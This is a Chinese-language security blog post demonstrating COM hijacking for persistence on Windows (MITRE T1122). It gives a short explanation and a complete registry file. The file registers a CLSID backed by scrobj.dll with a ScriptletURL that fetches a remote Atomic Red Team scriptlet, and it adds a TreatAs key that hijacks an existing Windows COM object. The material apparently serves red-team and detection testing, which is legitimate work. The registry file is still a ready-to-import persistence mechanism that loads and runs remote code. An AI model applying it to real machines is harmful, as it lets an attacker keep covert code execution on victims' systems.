---
title: winlogon_regedit
date: 2018-02-12 20:12:01
tags: Windows
categories: Windows
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/winlogon.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

``` stylus
Microsoft组件对象模型（COM）是Windows内的一个系统，用于通过操作系统实现软件组件之间的交互。
1攻击者可以使用这个系统插入恶意代码，通过劫持COM引用和关系来代替合法的软件来执行持久化。
劫持COM对象需要在Windows注册表中进行更改，以将引用替换为可能导致该组件在执行时无法工作
的合法系统组件。当系统组件通过正常的系统操作执行时，攻击者的代码将被执行。2 攻击者很可能劫
持足够频繁使用的对象来保持一致的持久性水平，但不可能在系统内破坏明显的功能，以避免可能导致
检测的系统不稳定。
```


## winlogon.reg
``` stylus
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]
@="AtomicRedTeam"
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00\CLSID]
@="{00000001-0000-0000-0000-0000FEEDACDC}"
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]
@="AtomicRedTeam"
[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]
@="{00000001-0000-0000-0000-0000FEEDACDC}"
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
@="AtomicRedTeam"
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
@="C:\\WINDOWS\\system32\\scrobj.dll"
"ThreadingModel"="Apartment"
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
@="AtomicRedTeam.1.00"
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
@="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
@="AtomicRedTeam"
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{06DA0625-9701-43DA-BFD7-FBEEA2180A1E}]
[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{06DA0625-9701-43DA-BFD7-FBEEA2180A1E}\TreatAs]
@="{00000001-0000-0000-0000-0000FEEDACDC}"
```



![enter description here][2]
https://twitter.com/subTee/status/962767403464577024
https://attack.mitre.org/wiki/Technique/T1122
https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5



  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180212_201037.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1518437671161.jpg 